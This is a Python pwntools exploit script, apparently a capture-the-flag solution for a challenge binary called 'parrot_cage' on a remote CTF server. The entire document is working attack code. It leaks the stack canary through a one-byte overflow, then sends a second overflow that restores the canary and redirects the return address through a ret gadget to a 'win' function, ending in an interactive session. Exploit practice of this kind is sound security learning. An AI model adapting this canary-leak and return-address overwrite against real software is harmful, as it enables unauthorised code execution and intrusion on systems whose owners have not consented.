from pwn import *

elf = context.binary = ELF('./parrot_cage', checksec=False)
#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13538)

canary_offset = 72
return_offset = 88
return_rop = 0x000000000040101a

p.recvuntil(b"Say 'bye' when you're done chatting.\n\n")

payload = b"A" * (canary_offset + 1)
p.send(payload)

p.recvuntil(payload)

leak = p.recv(7)
print("leak =", leak)
canary = b"\x00" + leak
print("canary =", hex(u64(canary)))

payload = flat(
    b"A" * canary_offset,
    canary,
    b"B" * (return_offset - canary_offset - len(canary)),
    p64(return_rop),
    p64(elf.symbols.win)
)

p.send(payload)
p.sendline(b"bye")
p.interactive()